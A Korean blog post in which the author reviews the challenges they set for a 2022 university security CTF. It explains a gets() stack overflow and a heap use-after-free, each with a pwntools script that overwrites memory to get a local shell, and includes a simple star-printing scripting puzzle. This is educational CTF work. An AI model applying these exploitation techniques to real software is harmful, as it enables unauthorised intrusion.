---
layout: post
title: "제1회 융합보안공학과 CTF 문제 write-up"
author: "hazziin"
tags: [I.Sly()]
---

2022년 말 I.Sly()에서 출제했던 학과 CTF 문제를 백업 겸 + 돌아볼 겸 정리하려고 한다.
---
# Pwn
## [Pwn] NICS

Network Interface Checking Service! 

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char v4[32]; // [rsp+0h] [rbp-50h] BYREF
  char command[10]; // [rsp+20h] [rbp-30h] BYREF
  __int16 v6; // [rsp+2Ah] [rbp-26h]
  int v7; // [rsp+2Ch] [rbp-24h]
  __int64 v8; // [rsp+30h] [rbp-20h]
  __int64 v9; // [rsp+38h] [rbp-18h]
  unsigned __int64 v10; // [rsp+48h] [rbp-8h]
 
  v10 = __readfsqword(0x28u);
  init(argc, argv, envp);
  strcpy(command, "ifconfig");
  command[9] = 0;
  v6 = 0;
  v7 = 0;
  v8 = 0LL;
  v9 = 0LL;
  printf("[Network Interface Checking Service]\n\nWhat's your name?\n>> ");
  gets(v4);
  printf("\nHi, %s.\nThe following are network interface information for this server:\n", v4);
  system(command);
  return 0;
}
```
간단한 stack bof 문제다.
20행에서 `gets()`를 통해 입력을 받고 있어 `command` 버퍼까지 input을 넣을 수 있으며, 이를 통해 `system()`에 원하는 명령을 입력할 수 있다.
32byte만큼 dummy를 입력한 후, 이후에 `/bin/sh\x00`을 입력하면 셸을 획득할 수 있다.

```py
from pwn import *
 
p = process("./nics")
 
payload = 'A'*32
payload += '/bin/sh\0'
 
p.recv()
p.send(payload)
 
p.interactive()
```

## [Pwn] Happy New Year

새해 복 많이 받으세요~~ >.<

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char *v3; // rdi
  __int64 v4; // rdx
  size_t v5; // rax
  size_t v6; // rax
  int v8; // [rsp+8h] [rbp-28h] BYREF
  unsigned int v9; // [rsp+Ch] [rbp-24h]
  int v10; // [rsp+10h] [rbp-20h]
  int i; // [rsp+14h] [rbp-1Ch]
  char *s; // [rsp+18h] [rbp-18h]
  char *v13; // [rsp+20h] [rbp-10h]
  unsigned __int64 v14; // [rsp+28h] [rbp-8h]
 
  v14 = __readfsqword(0x28u);
  init(argc, argv, envp);
  v9 = 0;
  v8 = 0;
  v10 = 1;
  s = 0LL;
  v13 = 0LL;
  v3 = a2023HappyNewYe;
  puts(a2023HappyNewYe);
  while ( v10 )
  {
    init(v3, argv, v4);
    printMenu();
    argv = (const char **)&v8;
    __isoc99_scanf(&unk_20E0, &v8);
    v3 = byte_9 + 1;
    putchar(10);
    switch ( v8 )
    {
      case 1:
        if ( !s || !*s || !s[32] )
        {
          s = (char *)malloc(0x100uLL);
          puts("What's your name?");
          setvbuf(stdin, 0LL, 2, 0LL);
          fgets(s, 32, stdin);
          v5 = strlen(s);
          s[v5 - 1] = 0;
          puts("What do you want as a gift?");
          setvbuf(stdin, 0LL, 2, 0LL);
          argv = (const char **)&qword_20;
          fgets(s + 32, 32, stdin);
          v6 = strlen(s + 32);
          s[v6 + 31] = 0;
          putchar(10);
          *((_QWORD *)s + 8) = printGift;
        }
        (*((void (__fastcall **)(char *))s + 8))(s);
        v3 = byte_9 + 1;
        putchar(10);
        break;
      case 2:
        if ( !v13 || !*v13 )
        {
          v13 = (char *)malloc(0x100uLL);
          puts("Write a New Year's message.");
          setvbuf(stdin, 0LL, 2, 0LL);
          fgets(v13, 128, stdin);
          putchar(10);
        }
        argv = (const char **)v13;
        v3 = "Your New Year's Message: %s\n";
        printf("Your New Year's Message: %s\n", v13);
        break;
      case 3:
        argv = (const char **)++v9;
        printf("I'll give you %d rabbits!\n", v9);
        for ( i = 0; i < (int)v9; ++i )
          printRabbit();
        if ( v9 == 2023 )
        {
          puts("OMG!! You found a special Gift!!");
          argv = (const char **)specialGift;
          printf("Shell address is...: %p\n", specialGift);
        }
        v3 = "Happy New Year!\n";
        puts("Happy New Year!\n");
        break;
      case 4:
        free(s);
        v3 = v13;
        free(v13);
        v9 = 0;
        break;
      case 5:
        v10 = 0;
        break;
      default:
        init(10LL, &v8, v4);
        break;
    }
  }
  return 0;
}
```
<img src="{{ '/assets/isly_writeup/img01.png' | relative_url }}" width="350" class="img-left">

메뉴를 순서대로 정리하면 아래와 같다.

1. `0x100`만큼 동적 메모리 할당 후 이름과 선물을 입력받으며, 이미 입력했을 경우 입력 값 출력
2. `0x100`만큼 동적 메모리 할당 후 메시지를 입력받으며, 이미 입력했을 경우 입력 값 출력
3. 토끼를 받음
4. 토끼 수 및 메모리 free
5. 프로그램 종료

이때, 1번 메뉴와 2번 메뉴가 같은 크기의 메모리를 할당한다는 점과 4번 메뉴에서 dangling pointer가 발생하는 점을 이용해 uaf를 트리거할 수 있다. 또한 3번 메뉴에서 2023번 토끼를 받았을 경우 `/bin/sh`를 실행시키는 함수의 주소를 출력해 준다.
1번 메뉴에선 구조체의 포인터에 `printGift()` 주소를 할당하고 있는 것을 확인할 수 있다. 이를 디버거로 확인해 보면 아래와 같다.

<img src="{{ '/assets/isly_writeup/img02.png' | relative_url }}" width="700" class="img-left">

첫 32byte에는 이름, +`0x20`에는 선물, 그 이후 +`0x40`에는 `printGift()` 주소가 저장된다. 따라서 3번 메뉴로 토끼를 받아 셸을 실행하는 함수의 주소를 획득하고, 1번 메뉴로 힙 메모리를 할당받은 뒤 4번 메뉴로 해제한다. 이후 2번 메뉴로 `printGift()`의 주소를 덮어쓴 뒤 1번 메뉴로 실행하면 셸을 획득할 수 있을 것이다. 
최종 익스플로잇 코드는 아래와 같다.

```py
from pwn import *
 
p = process("./happynewyear")
 
p.recv()
for i in range(2022):
    p.sendline("3")
    p.recvuntil(b'ear!')
p.sendline("3")
p.recvuntil('is...:')
shell = p.recvuntil('\n')
shell = shell[:-1]
 
p.sendline("1")
p.sendline("AAAA")
p.sendline("BBBB")
 
p.sendline("4")
 
shell = shell.decode('utf-8')
payload = b"A"*64
payload += p64(int(shell, 16))
p.sendline("2")
p.send(payload)
 
p.sendline("")
p.sendline("1")
 
p.interactive()
```

# Misc
## [Misc] ☆★☆

미치겠다 별들아...

<img src="{{ '/assets/isly_writeup/img03.png' | relative_url }}" width="500" class="img-left">
주어진 숫자만큼 별을 찍으면 되는 문제이다.
당연히 별을 일일이 찍으라고 낸 문제는 아니고... 프로그래밍을 유도한 문제이다.
혹시나 싶어 일부러 타임아웃은 걸지 않았다. 만약 한 번도 틀리지 않고 입력했다면 노력상으로(...) 플래그를 받을 수 있도록 만들었다.

```py
from pwn import *
 
p = process("./starstarstar")
 
p.recvuntil(b"start!")
for i in range(100):
    p.recvuntil(b"100) ")
 
    line = p.recvline()
    line = line.decode('utf-8')
    line = line.split()
 
    string = ''
    for j in range(len(line)):
        string += "*" * int(line[j])
        if j != len(line)-1:
            string += " "
    p.sendline(string)
 
flag = p.recvuntil(b"}")
print(flag)
```
---
2년이나 지난 지금 보니 어렵다고 생각하고 낸 문제도 생각보다 쉽고... 또 허접한 부분도 많아서 조금 웃기다... ^^
당시엔 시스템 해킹을 잘 안다고 생각했는데, 공부하고 있는 지금 생각하면 아직도 갈 길이 멀다는 생각이 들어 기분이 묘하다.

<br>